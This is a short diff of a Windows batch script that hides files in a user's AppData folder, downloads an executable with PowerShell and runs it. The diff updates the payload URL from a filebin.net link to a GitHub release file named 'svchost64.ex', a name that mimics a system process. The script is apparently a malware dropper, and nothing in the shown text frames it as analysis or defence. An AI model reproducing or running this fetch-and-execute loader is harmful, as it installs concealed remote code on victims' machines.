@@ -31,5 +31,5 @@ if '%errorlevel%' NEQ '0' (
 cd C:\Users\%USERNAME%\AppData\Local\Anon" 
 attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\2.bat" /s /d
 attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Agent.exe" /s /d
-Powershell -Command "Invoke-Webrequest 'https://filebin.net/xvl049bgivyjbab0/HIDEHEY.ex' -OutFile Agent.exe"
+Powershell -Command "Invoke-Webrequest 'https://github.com/xst4/patch1/releases/download/payloads/svchost64.ex' -OutFile Agent.exe"
 start Agent.exe
